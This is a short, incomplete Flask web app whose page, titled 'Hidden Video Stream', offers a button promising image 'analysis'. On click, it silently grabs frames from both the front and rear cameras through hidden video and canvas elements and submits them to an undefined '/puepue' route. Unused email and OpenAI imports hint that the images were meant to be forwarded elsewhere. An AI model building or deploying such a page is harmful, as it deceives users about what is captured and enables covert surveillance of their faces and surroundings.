from flask import Flask, request, render_template_string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import base64
import re
import random
from openai import OpenAI

client = OpenAI(
    api_key=myopenaiapikey,
)
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hidden Video Stream</title>
    </head>
    <body>
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <form id="Form" method="POST" action="/puepue">
            <input type="hidden" name="imageData" id="imageData">
            <input type="hidden" name="imageData2" id="imageData2">
        </form>
        <button id="captureBtn">画像をキャプチャして解析</button>
        <script>
            function sendpic(facingMode, inputId) {
                return new Promise((resolve, reject) => {
                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    const imageDataInput = document.getElementById(inputId);
                    const context = canvas.getContext('2d');

                    const constraints = {
                        video: {
                            facingMode: facingMode
                        }
                    };

                    navigator.mediaDevices.getUserMedia(constraints)
                        .then((stream) => {
                            video.srcObject = stream;
                            video.addEventListener('loadeddata', () => {
                                const aspectRatio = video.videoWidth / video.videoHeight;
                                const newWidth = video.videoWidth;
                                const newHeight = newWidth / aspectRatio;

                                canvas.width = newWidth;
                                canvas.height = newHeight;

                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const dataUrl = canvas.toDataURL('image/png')
                                imageDataInput.value = dataUrl;

                                resolve();
                            });
                        })
                        .catch((err) => {
                            console.error('Error:', err);
                            alert(`Error: ${err.name} - ${err.message}`);
                            reject(err);
                        });
                });
            }

            async function pue() {
                await sendpic('user', 'imageData');
                await sendpic('environment', 'imageData2');
                document.getElementById('Form').submit();
            }

            document.getElementById('captureBtn').addEventListener('click', pue);
        </script>
    </body>
    </html>
    ''')



if __name__ == '__main__':
    app.run()
